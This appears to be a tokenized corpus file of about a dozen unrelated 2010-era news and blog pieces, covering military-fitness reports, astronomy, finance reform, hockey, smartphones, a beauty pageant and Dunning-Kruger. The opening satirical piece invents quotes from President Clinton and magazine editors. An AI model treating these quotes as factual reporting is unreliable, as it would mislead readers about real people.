Edith 's death — so sudden , so unremarkable — has not sent shockwaves of grief and despair rippling across the land .
" The American people face bold new challenges in the 21st century , " President Clinton said Monday in an unrelated speech which made no mention of the incident .
" We will rise to meet these challenges together . "

Said Time magazine editor Richard Turner , " I want to stress that we have no intention of featuring Edith Pelphrey on the cover of Time . "
" Neither will we , " concurred People magazine 's Kathie Holcomb .
" There 's just no sell . "

But who was Edith ?
What was she going through as she neared the end ?
In these modern times , do we as Americans even care about such questions ?
The answer is clear , and it is : no , we do not .
But now , after what little tears there were have long fallen , lingering questions about Edith 's murder remain , failing to elicit anything beyond indifference from anyone .
" I was just going to the bookstore , " said Casper resident Dan Vermeer , 24 , moments after learning of Edith 's death .
" After that I 'm supposed to meet a friend at a coffee shop . "

" Hey , look at this ! " a visibly agitated Rev. Geoff Noyes , of Casper 's First Methodist Church , said to MaryAnn , his wife of 43 years .
" They 're having a sale at Safeway !
Look at those tuna discounts . "
These Casper residents , like millions of people across the nation , will not form any sort of activist group or mobilize to find Edith 's killer ; launch any sort of posthumous tribute ; order any flower arrangement ; or sing moving hymns in her memory .
Neither , for that matter , will they ever know who she was , nor would they care to .

Why was she found strangled in her own home ?
There was a ransom note found with the body , but no kidnappers or , for that matter , evidence of any kidnapping at all .
Could it be that the murderer was actually someone from the Pelphrey family itself ?
By and large , nobody could care less .
" I told you already that I have no idea what you 're talking about , sir .
If you keep calling here I 'll have you fined , " Casper chief of police Wayne Daugherty told reporters .

It 's obvious that Edith , too homely to give a second thought about in life , is even less likely to attract anyone 's attention now that she has been laid to eternal rest .
" I feel deeply , with every ounce of my soul , that something must be done to ensure the public that no matter what happens in the future , this night will not be forgotten , and that the Li'l Miss Casper Beauty Pageant will continue to inspire us all , " Casper Mayor Roger DiNizio said , addressing an assembled crowd of 11,000 .

Upon the completion of DiNizio 's remarks , the pageant audience — decked out in their finest for the occasion — cheered , rising from their seats in a spontaneous standing ovation .
The April 20 , 2010 USA Today article Facing unfit recruits , military leaders target food in schools , states , ' The obesity epidemic is threatening national security , so schools ' ” which are on the front lines in battling the problem ' ” need to boot out junk food and serve healthier snacks and meals , a group of retired military leaders is announcing today . ' This group of retired military officers have joined together in Mission : Readiness , Military Leaders for Kids , an organization that is highlighting the increasing problem of finding qualified young adults to serve in the military .
On Tuesday , April , 20 , 2010 , these retired military leaders , along with U.S. Senator Richard Lugar ( Rep. - Indiana ) and U.S. Department of Agriculture Secretary Tom Vilsack , released new findings on the dramatic increase of obesity among young adults age 17 to 24 years and its negative consequences towards U.S. national security .
This dramatic increase in obesity within our young people is reducing the numbers of young adults that are eligible to serve in the military .
And , it is an alarming trend that is threatening the ability of the United States to protect itself militarily from our adversaries in foreign countries and here at home .
The group states that about 25 % of young adults , 17 to 24 years of age are unqualified to serve in the military because they are overweight or obese ( extremely overweight ) .
Other problems coming out of this group 's concern within young adults and their unqualified reasons to serve in the military is not having a high school education , having a criminal record , or having medical problems ( which is often related to being overweight or obese ) .
Page two continues the story on Mission : Readiness and their fight to slim down our young people .
Mission : Readiness is a bi-partisan , non -profit group of about 130 retired generals , admirals , and other senior military leaders from the United States military that are addressing the problems of finding qualified people to serve in the military .
They , as a group , want to ensure ''¦ continued American security and prosperity into the 21st century by calling for smart investments in the next generation of American children . ' Retired rear admiral Jamie Barnett , one of the group 's members , states , " When that many young adults can't fight because of their weight , it affects our national preparedness and national security .'
[ USA Today ]
The group is supporting the Child Nutrition
Act because of the poor quality foods being served in U.S. schools today .
Currently , about 31 million children eat lunch at school every day , and 11 million eat breakfast there .
In addition , about one - third to one - half of all calories consumed in a day by children and young adults are consumed in school .
Thus , the ability of school children to slim down is partially the responsibility of our school system , which is why these military leaders are promoting healthy eating in schools .
The group states that about 75 % of young adults in the United States today , age 17 to 24 years , are unfit to join the military because they are too heavy in weight , did not graduate from high school , have criminal records , or have medical problems .
They state that at least 9 million young people are ' too fat to fight . '
 Page three continues with information on the report ' Too Fat To Fight ' and where to read more about it .
The Child Nutrition
Act is a federal law that was signed on October 11 , 1966 by president Lyndon B. Johnson .
The Act established , included , or supported such programs as the National School Lunch Program , the Special Milk Program , and the School Breakfast Program .
It is currently inactive , but is in the process of being re-authorized by members of the U.S. Congress .
The retired military group has published the report ' Too Fat to Fight .'
It states , in part , ' Retired Military Leaders Want Junk Food Out of America 's Schools . '
The report also states , ' As retired Generals , Admirals , and other senior leaders of the United States Armed Forces , we know firsthand that national security must be America 's top priority .'' Our organization recently released a report citing Department of Defense data indicating that an alarming 75 percent of all young Americans 17 to 24 years of age are unable to join the military because they failed to graduate from high school , have criminal records , or are physically unfit . '' Being overweight or obese turns out to be the leading medical reason why applicants fail to qualify for military service .
Today , otherwise excellent recruit prospects , some of them with generations of sterling military service in their family history , are being turned away because they are just too overweight . ' Barnett adds , " We are hitting our recruitment needs , but we know that some of that has to do with the economy , and those of us who have served are concerned about the trends for the future .
Our national security in 2030 is absolutely dependent on reversing the alarming rates of childhood obesity . "

The group states , ' We need a bold strategy to inspire our young people to do better , and to increase the chances that they will succeed . ' So , ' Uncle Sam Wants You '¦ Fit , Educated , and Healthy ! '
Ancient galaxy cluster contains ' modern ' galaxies
A team of astronomers including Ivelina Momcheva of the Carnegie Observatories has discovered the most distant cluster of galaxies ever found .
In a surprising twist , the young cluster born just 2.8 billion years after the Big Bang appears remarkably similar to the much older present - day galaxy clusters .
" We were looking for clusters of galaxies when the Universe was still very young , " says Carnegie 's Momcheva , who did the spectroscopic analysis which led to the discovery of the cluster .
" One might think that the clusters we find would look young as well .
However in this cluster we found a number of surprisingly ancient - looking galaxies .
This cluster resembles modern - day clusters , which are nearly 10 billion years older . "
" It is like we dug an archeological site in Rome and found pieces of modern Rome in amongst the ruins , " adds lead author Casey Papovich of Texas A&M University .
CLG J02182-05102 , as the cluster is called , contains approximately 60 galaxies , including several enormous red galaxies at its center holding 10 times as many stars as the Milky Way .
Such galaxies were thought to be rare in the universe at this early stage .
Similar galaxy clusters today have had billions of more years to develop and grow .
The cluster was first detected using NASA 's Spitzer Space Telescope , which is sensitive to the infrared light emitted by the galaxies .
The researchers observed the high density of galaxies within CLG J02182-05102 , but could not determine from the Spitzer data whether its galaxies are indeed gravitationally bound , as is the case with true galaxy clusters .
For these measurements , they used an advanced spectrograph on the Carnegie Institution 's Magellan / Baade 6.5 meter telescope at the Las Campanas Observatory in Chile .
Analyzing the faint light from seven galaxies near the center the cluster , they found that the galaxies had an average redshift of 1.62 .
" This means that we are seeing it the way it looked 9.6 billion years ago , " says Momcheva .
" Since then it has moved away from us as the universe has expanded .
Today the distance to the cluster is 15 billion light years . "
Galaxy clusters are the largest gravitationally bound structures in the Universe , and studying the new discovery will help researchers understand how galaxies evolve and form clusters .
CLG J02182-05102's large red galaxies are unexpected because most galaxies at that time were still rapidly forming stars , and , as a result , appear smaller and their emitted light bluer .
For the galaxies in ClG J02182-05102 to have become chock full of old , red stars so quickly compared to their contemporaries , these galaxies must have " lived fast and died young , " Papovich said .
" We are witnessing the youth of truly massive cluster of galaxies , " says Momcheva .
" ClG J02182-05102 will continue growing , accreting more galaxies and slowly aging .
By the present day it has probably grown to be a large metropolis of a cluster like our neighbor , the Coma cluster . "

You probably think of " tech support " as the bottom of the food chain .
" Shit flows downhill " and all that .
After all :
Tech support deals with insane customers .
Tech support answers the phone ; a job even salesmen do n't want .
Tech support keeps angry customers at bay while having no power to effect change .
Yep , that sounds lowly .
Dismal too — how would you like to deal with an irate voice screaming at you when you know how to fix the problem but lack the authority to do it ?
This is a masochistic job for a poor slob with no other job prospects , right ?
If this is your attitude , your conception of tech support is completely backwards and you 're missing out on important channels for marketing , product development , and sales .
The unexpected face of your company
We 've all been jarred by someone 's voice not matching their picture .
Take English footballer David Beckham , the quintessential picture of manly sportif — washboard abs , ex-captain of the English national team , and married to Posh Spice .
But then he opens his mouth .
It 's like Kermit the Frog got kicked in the balls .
( Oh , sorry UK folk , I mean kicked in the bollocks . )
It 's so unexpected it 's the only thing you remember .
Of the 3,204,523 pub conversations where someone said " Have you heard him speak ? " maybe only 17 could tell you what he actually said .
You assume your home page is the public face of your company , but what happens when you open your mouth ?
What happens when your bullet points collide with your behavior ?
For most of your customers , tech support is the only human interaction they 'll have with you .
Are you really going to leave that up to your worst - treated , least - paid , least - qualified employees ?
Tech support is sales
At Smart Bear we made millions of dollars in both individual and enterprise sales without " sales . "
Well , at least without the usual definition of " sales " — a collection of processes , personalities , and management single - mindedly focused on hauling in revenue on a quarterly schedule .
How did we get six - figure deals without playing golf or using Salesforce ?
Simple : Our tech support was sales .
You could say the purpose of tech support is to answer questions or to unstick people who are confused , but I say the purpose of tech support is to make your customers fantastic at their jobs , which happen to involve your product .
( Yes , I 'm flagrantly paraphrasing the legendary Kathy Sierra , but the idea applies as much to tech support as to product development . )
So this means you do n't just help them locate a command in the menubar , you find out what they 're trying to accomplish and help them do that .
You do n't just explain a feature but help them use the result to impress their boss .
You do n't just apologize because you do n't have the feature they want , you help them work around it and be successful anyway .
You know your product and problem - space better than your customers , so it 's not that hard to make them far more successful than they would be stumbling around without calling tech support .
Enabling your customers is n't just about your product , but rather your entire company .
Make your customer awesome and she 'll give you money so she can keep being awesome .
That 's sales .
A pleasant surprise
Everyone 's stereotype of tech support is negative .
Oh the tales :
Ask tech support how to change the font and they 'll tell you to reboot your laptop .
Ask tech support to change your billing address and they up - sell you on three things you do n't want .
Calling tech support requires a GPS to navigate the labyrinth of menu options ( which may have changed ) , wait - queues , and typing in your account number 3 times " for security purposes , " as if someone who stole your account number is incapable of typing it more than once .
When your customers expect a turd sandwich and you deliver a turkey club with chipotle mayonnaise , you earn major bonus points , like users twittering about your service , people switching to your service because of tech support , or customers not only following your Tweets but instructing their followers to do the same .
Oh look !
Apparently tech support is a better " social media outreach " program than hiring interns to spray comments on random blogs .
Are you surprised ?
They say " under - promise , over - deliver , " and tech support has " under - promise " built in !
Sure super - fantastic tech support is best , but even if you merely act like a human being you 're already ahead .
If you just answer email with a non-automated response you 're killing it .
Why pass up such an easy opportunity to thrill a customer ?
Is n't " a pleasant surprise " too rare in business , and do n't you want to be known as the company where it happens every day ?
The closest thing to getting " outside the building " while staying inside the building
The Internet is abuzz with Steve Blank 's phrase that everything you need to know about your customers is " outside the building , " meaning that real customer development means talking to folks face to face , seeing their problems in the wild , and watching their faces react to your pitch , not brainstorming around a whiteboard and twiddling the font size in your PowerPoints .
And I agree !
Still , for the Work - a - preneur﻿ or the bootstrapper with no travel budget it 's hard to get outside the building .
Yes you should try as much as you can — it 's worth it — but what about the other 94 % of the time that you 're at your desk , by which I mean the coffeeshop table closest to the power outlet that is n't loose ?
Tech support is the next - best thing .
Tech support is where people complain about what 's not working , what 's missing , and what 's confusing .
But it 's not enough to just catalog problems !
The insights lurk in the meta-questions .
If someone 's confused , for example , the immediate task is to set them straight , but there 's valuable product development to be had :
What caused the confusion in the first place ?
Is my customer 's world - view different from mine ?
Is our terminology wrong ?﻿
Are we using the wrong metaphors ?
Do I need to optimize the new - user experience instead of the expert - user experience ?
Those are tactical questions stemming from the immediate problem , but then there 's even more interesting strategic questions :
Does this hiccup belie a customer pain - point I did n't know existed but I can solve ?﻿﻿
Is there enough evidence of a conceptual mis-match that I should pivot ?
Is there a new product idea here ?
If they 're abusing my product to get what they really want , can I provide what they really want from the start ?
This last line of questioning is exactly how Smart Bear came to be a company about peer code review and not " version control data mining . "
If I had n't paid attention attention to these meta-questions , you would n't be reading this right now .
Yes , it 's that critical .
To answer these you have to go back and forth with customers to hack into the root cause .
You have to see hundreds of emails so you get a gut - feel for what customers are experiencing — something you can't get from a Incident Summary Report or somesuch automation .
Tech support is the closest , most honest chance for product development — certainly more straightforward than squeezing it through traditional " sales . "
Here 's where real users discover and report on your product .
Are you listening , or just throwing it away ?

BP and Massey : What I do n’t like from the president ’s administration is this sort of , you know , “ I ’ll put my boot heel on the throat of BP . ”
I think that sounds really un-American in his criticism of business .
I ’ve heard nothing from BP about not paying for the spill .
And I think it ’s part of this sort of blame game society in the sense that it ’s always got to be someone ’s fault .
Instead of the fact that maybe sometimes accidents happen .
I mean , we had a mining accident that was very tragic and I ’ve met a lot of these miners and their families .
They ’re very brave people to do a dangerous job .

One of the few gripes people is having with the new EVO 4G is short battery life .
While on 4G and medium to heavy usage , I ’ve seen the 4G go from fully charged to almost dead in 4 - 5 hours .
This is unacceptable for today Smartphone’s .
It should last at least 8 hours or more if you ’re not a heavy user .
1 . Add widgets to your HTC Sense homescreen to control the radios ( Bluetooth , WiFi , 4G )
2 . Use the widgets to turn off select radios when not in use .
If you ’re not using 4G , switch it off and fall back on 3G instead to gain better battery life .
3 . Turn off network roaming .
By default , roaming is turned on for the HTC EVO 4G out of the box , which means that the phone scans for the strongest CDMA / EV - DO signal .
If you ’ve got great Sprint coverage where you are and do n’t need to roam onto one of Sprint ’s partner carriers , turn off roaming so the phone does n’t need to constantly search for the best signal .
4 . Turn on automatic brightness so the screen can adjust in light and dark environments rather than having brightness turned all the way up .
Alternatively , you can also set the screen brightness lower by default .
5 . Turn off live wallpapers –they ’re pretty , but they do use a little bit of extra processing power .
6 . Carry an extra battery or plug into a car charger when you can .
Give these settings a whirl and see if it improves your battery life .
Post a comment on your experience with the EVO ’s battery and the things you do to improve the battery life .
These settings should work but in the mean time , keep you charger handy especially if you live in a 4G area .

The US Senate has passed a bill providing the most sweeping overhaul of financial regulations since the 1930s .
The Senate passed the bill by 59 votes to 39 .
It must still be merged with a version in the House .
The bill creates new ways to watch for financial risks and makes it easier to liquidate large failing firms .
President Obama said Americans would never again pay " for Wall Street 's mistakes " adding that Wall Street had tried but failed to scupper the bill .
Key points of the bill include : the creation of a new watchdog agency
restraints on larger banks , allowing them to take fewer risks
requiring borrowers to prove that they can pay back even the most basic of mortgages
giving the Federal Reserve the power to take control of large firms at risk of collapse - and break them up if necessary
reform of the complicated derivatives market .
Reconciling the bills
Democratic Party Senate Majority Leader Harry Reid said : " To Wall Street it says , ' No longer can you recklessly gamble away other people 's money . ' "
What does it all mean ?
In theory banks will be taking fewer risks - and they will certainly be less profitable Robert Peston , BBC business editor Read Robert 's blog Q&A : US bank regulation details
The bill must still be reconciled with a version passed in the House of Representatives in December .
Although there is much common ground between the two bills , there are also some differences .
The Senate bill is in some ways more aggressive on issues such as the regulation of derivatives - complex financial instruments that are largely blamed for accelerating the Wall Street crisis - and executive pay .
It says that banks would have to spin off their derivatives business , while the House bill would not require them to do so .
The Senate would also allow the Federal Reserve to set standards on what it deems excessive compensation .
Under the House 's bill , regulators would have a say on compensation practices , but not on pay itself .
Analysis
There will be be more haggling and further votes before the bill becomes law , but this was a crucial moment .
Opinion is sharply divided over the bill 's merits .
Executives at financial companies have been very critical of it , but some on the left of the Democratic Party say it does n't go nearly far enough in changing the culture of Wall Street .
Nonetheless Mr Obama is seeing another key piece of his domestic policy plan fall into place and his administration , at home at least , really seems to be gaining momentum now .
The House bill goes further on consumer protection , calling for an independent Consumer Financial Protection Agency , whereas the Senate would create a Consumer Financial Protection Bureau within the Fed .
Barney Frank , head of a key House panel , said that he thought Mr Obama might be able to sign a bill into law before the 4 July holiday .
The president earlier said the financial industry had repeatedly tried to block the regulatory reforms , using lobbyists , millions of dollars in advertising and special interest " loopholes " .
" Today , I think it is fair to say these efforts have failed , " he said , in a statement in the Rose Garden of the White House .
' Decades to come '
The bill 's progress had been stalled by some Republican leaders who did succeed in making some amendments .
Republican Senator Richard Shelby , who opposed the legislation , said : " The decisions we 've made will have an impact on the lives of Americans for decades to come .
" Judgement will not be rendered by self - congratulatory press releases , but , rather , by the marketplace .
And the marketplace does not give credit for good intentions . "
On Wednesday , Republicans , aided by two Democrats , had blocked a final Senate vote on the bill .
But on Thursday , a vote to end debate on the bill was passed by 60 - 40 , the minimum needed to succeed .
There is widespread public support for tightening the regulation of Wall Street .
European taskforce
Meanwhile , European finance ministers are meeting in Brussels later to discuss ways to prevent another crisis like the one in Greece .
They will look at Germany 's unilateral ban on naked short - selling , as well as future co-ordination of such market - moving decisions .
Also on the agenda will be changes to EU budget rules , with one idea being to look at national budget proposals in the first six months of the year instead of the second six months .
Although they will be hoping to reach a consensus , the issue of tightening economic policy co-ordination could prove divisive .

Dan Keogh investigates .
Daniel Keogh : Pittsburgh , Pennsylvania , 1995 .
A local man , McArthur Wheeler , walks into two banks in the middle of the day and robs them both at gunpoint .
Making away with the cash , he is arrested later that evening .
Back at the station police sit him down and show him footage from the banks ' security cameras .
Wheeler can't believe it , the cameras had somehow seen through his disguise .
He was seen mumbling to himself , ' But I wore the juice . '
His was no ordinary disguise ; no balaclava , mask or elaborate makeup , just lemon juice , liberally applied to the face .
He was certain that the squirt of citrus would render him invisible to security cameras .
This tale of overconfidence despite utter incompetence illustrates an interesting area in psychology , one so interesting that Justin Kruger and David Dunning or Cornell University used it to open their 1999 research paper ' Unskilled and Unaware of it :
How difficulties in recognising one 's own incompetence lead to inflated self - assessment ' .
The paper describes what has now become known as the Dunning - Kruger effect .
You 've probably met someone who personifies it .
Perhaps you 've been a passenger with someone who claims to be an excellent diver and yet you spend the entire trip white - knuckled gripping the seat .
That 's Dunning - Kruger at work .
It 's the idea that the worse you are at something the more likely you 'll hold an inflated view of your own performance .
Dunning and Kruger have demonstrated this best through a series of experiments .
They tested a group of university students , those long - suffering lab rats of psychology , for their abilities in a series of tests on grammar , humour and logic .
After finishing each task the students were asked the guess how they had performed relative to their classmates .
And here 's the kicker ; across every test , the students at the bottom end of the bell curve held inflated opinions of their own talents , hugely inflated .
In one test of logical reasoning , the lowest quartile of students estimated that their skills would put them above more than 60 % of their peers when in fact they had beaten out just 12 % .
To put that misjudgement in perspective , it 's like guessing that this piece of music [ music for 5 seconds ] lasted nearly half a minute .
Even more surprisingly , the Dunning - Kruger effect leads high achievers to doubt themselves , because on the other end of the bell curve the talented students consistently underestimated their performance .
Again to the test of logic ; those topping the class felt that they were only just beating out three - quarters of their classmates , whereas in reality they had out - performed almost 90 % of them .
The verdict was in ; idiots get confident while the smart get modest , an idea that was around long before Dunning and Kruger 's day .
Bertrand Russell once said , ' In the modern world the stupid are cocksure while the intelligent are full of doubt . '
From his essay ' The Triumph of Stupidity ' , published in 1933 .
Think back to the robber concealed in lemon juice , surprised that such an ingenious plan could fail .
It 's suggested that those who are incompetent lack the ability to recognise their mistakes .
Dunning and Kruger demonstrated this in one of their experiments .
Even when the dunces were shown how their more competent classmates had answered their exams , they did n't become aware of their own mistakes .
In fact the opposite occurred ; they actually increased the estimate of their own marks .
Those who failed the task seemed to be completely oblivious to what a good result looks like .
Context did n't make them more aware of their stupidity , it acted to reinforce their delusions .
Charles Darwin once said , ' Ignorance more frequently begets confidence than knowledge , ' and Dunning and Kruger seem to have proven this point .
In light of this , it suddenly becomes clear why public debate can be so excruciating .
Debates on climate change , the age of the Earth or intelligent design are perfect real - life examples of the Dunning - Kruger effect .
It beautifully explains the utter confidence of those who , with no expertise , remain stubborn in their views regardless of overwhelming evidence .
It makes you want to shake them by the collar and scream about how stupid they are .
But evidence shows that 's not the best strategy .
The rather odd element of the Dunning - Kruger effect is that the incompetent do n't become aware of it until they become more competent .
The key is education .
Extending on their earlier experiments , Dunning and Kruger took half of their volunteers and trained them in how to solve the logic puzzles .
It was as though a light went on for the under achievers .
For the first time out of all the tests they began to realise that they were below average .
Suddenly aware of their incompetence , they readjusted their estimates to something more realistic .
For example , before being trained they had thought that they answered five out of the ten questions correctly , whereas in reality they had barely managed to score a single mark .
After being trained their estimates plummeted to a more realistic score of just one out of ten .
You can almost imagine them sinking their faces into their palms out of sheer embarrassment .
If you 've ever fancied yourself as a photographer , you might know just how this feels .
It only takes a weekend workshop for you to suddenly realise that the poorly lit snaps of your cat in the backyard are n't quite the masterpieces you 'd once imagined .
But the Dunning - Kruger effect is n't always as harmless as your crummy photography .
We all know bosses , friends and politicians who are fully controlled by the Dunning - Kruger effect .
At its extreme it lets charming and charismatic yet completely incompetent people to rise to the top and often end up being in charge .
So the next time your boss button - holes you with their latest bright idea or someone knocks on your door asking for your vote , remember David Dunning and Justin Kruger and ask yourself , ' Am I staring at the embodiment of brilliance or just overconfident incompetence ?'

Kelly Cup Finals Preview
May 14 , 2010 - ECHL ( ECHL ) News Release
PRINCETON , N.J. -
The battle to determine the national " AA " hockey champion begins Friday when the National Conference champion Idaho Steelheads host the American Conference champion Cincinnati Cyclones in Game 1 of the Kelly Cup Finals at 7:10 p.m. MT at Qwest Arena in Boise , Idaho .
Celebrating its 22nd season in 2009 - 10 , the ECHL is the Premier ' AA ' Hockey League and is the third - longest tenured professional hockey league behind only the National Hockey League and the American Hockey League .
The Kelly Cup trophy is named for Patrick J. Kelly , who presents it each year to the postseason champion .
Kelly was one of the founding fathers of the ECHL and the second inductee into the ECHL Hall of Fame in 2008 .
Kelly served as Commissioner for the league 's first eight seasons and was named Commissioner Emeritus in 1996 , a title that he continues to hold .
Kelly , who celebrated his 55th season in professional hockey in 2007 - 08 , coached 1,900 career games and had 935 wins .
Kelly coached in the Eastern Hockey League , the Southern Hockey League and the National Hockey League where he was the only coach to ever lead the Colorado Rockies to the Stanley Cup Playoffs .
Game 2 will be Saturday at 7:10 p.m. MT at Qwest Arena before the series shifts to Cincinnati where the Cyclones will host Games 3 and 4 at 7:30 p.m. ET at U.S. Bank Arena on May 18 and 20 .
Game 5 , if necessary , would be at 7:30 p.m. ET at U.S. Bank Arena on May 21 .
The series would return to Boise for Game 6 , if necessary , on May 25 at 7:10 p.m. MT and Game 7 , if necessary , at 7:10 p.m. MT on May 26 .
The ECHL is the primary development league for the AHL and the NHL .
The ECHL and the AHL are the only two minor professional hockey leagues that are recognized in the Collective Bargaining Agreement between the NHL and the National Hockey League Players ' Association .
The CBA states that any player on an NHL entry - level contract designated for assignment to a minor league must report if assigned to a team in the ECHL or the AHL .
A player on an NHL entry - level contract assigned to a minor professional league other than the ECHL or the AHL is not required to report and can request reassignment to a team in the ECHL or the AHL .
How They Got Here
Idaho won its first Brabham Cup as the ECHL 's regular season champion .
As the No. 1 seed in the National Conference , the Steelheads received a bye in the National Conference Quarterfinals .
Idaho defeated Utah 4 games to 0 in the National Conference Semifinals before eliminating Stockton 4 games to 2 in the National Conference Finals .
Cincinnati has played the maximum number of games in each series of the 2010 Kelly Cup Playoffs .
The Cyclones defeated defending Kelly Cup champion South Carolina 3 games to 2 in the American Conference Quarterfinals , winning Game 5 at South Carolina , 3 - 2 , in overtime .
In the American Conference Semifinals , the Cyclones defeated Charlotte 4 games to 3 , once again winning the deciding game on the road with a 2 - 1 win .
Cincinnati made ECHL history in the American Conference Finals becoming the first team in the 22 - year history of the league to come back and win a best - of - seven series after trailing 3 games to 0 as the Cyclones defeated Reading 4 games to 3 .
Steelheads Look For Third Kelly Cup , Cyclones Chase Second
Idaho won the Kelly Cup in 2004 and 2007 and is looking to join South Carolina as the only three - time winners of the trophy .
Cincinnati won the Kelly Cup in 2008 and is looking to become the third team to win multiple Kelly Cups .
The ECHL postseason champion from 1989 - 96 was presented the Riley Cup .
If the Steelheads win , they would tie the league record for championships held by Hampton Roads , who won in 1991 , 1992 and 1998 , and South Carolina , who won in 1997 , 2001 and 2009 .
Idaho is making its third appearance in the finals , tying the record held by the Greensboro Monarchs ( 1990 , 1991 and 1995 ) , the Hampton Roads Admirals ( 1991 , 1992 and 1998 ) , the Wheeling Nailers ( 1989 , 1990 and 1993 ) and the South Carolina Stingrays ( 1997 , 2001 and 2009 ) .
First Ever Finals Meeting Between Previous Winning Coaches
Idaho's Derek Laxdal , who led the Steelheads to the 2007 title , and Cincinnati's Chuck Weber , who led the Cyclones to the championship in 2008 , each look for their second Kelly Cup championship .
The winner will join Mike Haviland , who was the head coach with Atlantic City in 2003 and with Trenton in 2005 , as the only coach to win more than one Kelly Cup .
John Brophy is the ECHL all - time leader in championships with three , having led Hampton Roads to Riley Cup championships in 1991 and 1992 and a Kelly Cup title in 1998 .
This series marks the first time in the 22 - year history of the ECHL that two coaches who have previously won league titles meet in the final series .

While the iPhone is still an entirely different beast worldwide , Apple and Google ’s main fronts are in the United States , and a shift has occurred ( and , thankfully , we ’re not talking about plates within the earth ’s crust ) : Android has taken over the iPhone ’s US install base ( as was predicted by an AdMob mobile metrics report that gave us a similar preview ) .
NPD Group is reporting that – in Q1 2010 – Android has become the second - most installed smartphone OS in the United States with 28 % market share – coming just beneath RIM ’s Blackberry OS ( enjoying 36 % of the market share ) .
i Phone OS , on the other hand , currently sits at 21 % in third place .
I ’d imagine that the US smartphone market is very important for all of the vendors , and Android ’s proving that it can hold its own against the iPhone and – soon – possibly Blackberry .
Executive director of industry analysis for NPD Group , Ross Rubin , says :
“ As in the past , carrier distribution and promotion have played a crucial role in determining smartphone market share .
In order to compete with the iPhone , Verizon Wireless has expanded its buy - one - get - one offer beyond RIM devices to now include all of their smartphones . ”
With RIM , Microsoft , Apple , and Nokia all set to release new versions of their OS , Palm hoping to make a comeback with HP pulling their strings , and new operating systems seemingly popping up every day , the smartphone war will only get crazier from here and – as Phandroids – it ’s great to see that Android has more than just a fighting chance .

An unhappy crowd booed Miss USA judge Oscar Nunez when he asked Miss Oklahoma Morgan Elizabeth Woolard a question about Arizona ’s immigration law on Sunday night ’s pageant .
But could Woolard 's answer have cost her the crown ?
The " The Office " star asked Woolard if she supported Arizona ’s right to enforce the law , which requires police to verify a person 's immigration status if there 's " reasonable suspicion " that the person is in the country illegally .
VOTE : Did Oscar Nunez try to sink contestant with his question ?
Woolard said she supports state 's rights , adding that she is against illegal immigration , but is also against racial profiling .
" I'm a huge believer in states ' rights .
I think that 's what 's so wonderful about America , " Woolard said .
" So I think it 's perfectly fine for Arizona to create that law . "
The night 's events mirrored last year 's pageant , when gossip blogger Perez Hilton asked Miss California Carrie Prejean if she believed in gay marriage .
Prejean said she did n't , and a media firestorm ensued , with many arguing that it cost her the Miss USA title .
PHOTOS : Miss USA 's Controversial Lingerie Pics .
While many Americans are opposed to gay marriage , Prejean claimed she was victimized for her answer .
In perhaps a repeat of last year ’s contest , Woolard lost the crown after answering a controversial question that may be unpopular with some , but reflects the opinion of the majority of Americans .
Woolard lost out to 24 - year - old Miss Michigan , Rima Fakih .
PHOTOS : Scenes From the Controversial 2010 Pageant .
Fakih , an Arab - American from Dearborn , Michican took home the crown , despite nearly tripping on her evening gown .
Pageant officials said historical pageant records were not detailed enough to show whether Fakih was the first Arab American , Muslim or immigrant to win the Miss USA title .
The pageant started in 1952 as a local bathing suit competition in Long Beach , California .
During the interview portion , Fakih was also asked a question on a hot - button issue .
She was asked whether she thought birth control should be paid for by health insurance , and she said she believed it should because it 's costly .
" I believe that birth control is just like every other medication , even though it 's a controlled substance , " Fakih said .
Miss Virginia USA Samantha Evelyn Casey was the second runner - up , Miss Colorado USA Jessica Hartman was third runner - up , and Miss Maine USA Katherine Ashley Whittier was the fourth runner - up .

The Goldman Sachs Abacus fraud investigation is already losing the attention of a public ready to move on to fresh fields and scandals new .
But one aspect of the story of Fabulous Fab and the hedge fund Paulson & Co. has gotten surprisingly little attention .
Specifically , the collateralized debt obligations that John Paulson advised Goldman to create were based on very extensive research about housing prices and specific subprime mortgage performance in particular local markets .
Former Paulson analyst Paolo Pellegrini — who is best known for providing information to the Securities and Exchange Commission and for somehow being rich — discovered where the biggest bubbles had grown and which were in the process of blowing up .
His bets against these bubbles , of course , turned out to be right .
Pellegrini figured all this out using information that was readily available to anybody who was sufficiently motivated .
You would think somewhere in the United States government there might be such motivated people .
After all , we have an SEC , a Federal Reserve Bank , a Treasury Department , the formerly government sponsored entities Fannie Mae and Freddie Mac , the Census Bureau , many data collection and analysis agencies , and too many congressional committees .
All of these entities have the stability of the economy as part of their job description .
Yet all of them combined could not manage your money as intelligently as one short seller from Rome managed John Paulson's .
Pellegrini is an interesting figure not just for his good bets , but for some pretty idiosyncratic views on fiscal policy .
From a Bloomberg profile :
He sees no reason why Americans should deposit their savings in private banks , since the government already guarantees those deposits …
The public 's cash , he says , can be held at accounts at the Federal Reserve .
Loans can be made by nonbank lending institutions .
At a minimum , he says , there should be limits on bank profits — perhaps a 10 percent return on equity — to keep them from taking the kinds of risks that led to the housing bubble .
" You need a system where people wo n't be incentivized to take risks , " Pellegrini says .
" We do n't need bankers to take risks with our money . " [ … ]
How has the U.S. central bank handled the crisis ?
" The Fed is printing money , as instructed by the financial services industry , so that they can stick all of us with the bill , " Pellegrini says , slouching in a conference room chair in his offices in the former IBM Building in Manhattan … .
And Federal Reserve Chairman Ben S. Bernanke ?
" I have zero confidence in what the Fed is doing . "
Pellegrini and Paulson are not the only people who made money by assessing the abundant evidence that the real estate market was bubbling over .
( And just to be clear , I 'm only talking about their role as overt short sellers , not Goldman Sachs ' alleged misrepresentations to its clients . )
But if Sen. Chrisopher Dodd ( D - Connecticut ) , who heads one of the many committees that failed to identify the bubble , were serious about fixing the failures that led to the ongoing real estate correction , he'd be writing law that gets more people to act like these guys .
A smarter regulatory approach would be to encourage the creation of these crazy derivatives and complicated bets against the market , because these contain information that the market needs and regulators could pay attention to .
At the very least , Dodd 's financial regulatory bill should not be doing more to suppress the information that bears , short sellers and other " speculators " provide .
Needless to say , the Dodd bill takes a different approach .
It also continues to get worse .
Yesterday Senate Democrats stripped out one of the few sensible things in it — an amendment to wind down the failed GSEs .
( If you 're keeping score at home , keeping Fannie and Freddie on life support has cost your grandchildren another $ 40.1 billion just in the last ten days . )
The bill [ pdf ] does at least shunt short selling curbs into a " conduct a study " siding , but at the moment it 's aimed at sharply reducing use of derivatives .
If the purpose of regulation is to prevent excesses in markets , how can anybody justify a bill that reinforces all the excesses that caused the bubble ?
I owe the main ideas about Pellegrini above to Mike Alissi , who clearly just wants an Italian to be the hero of the story .
From the ATR website .
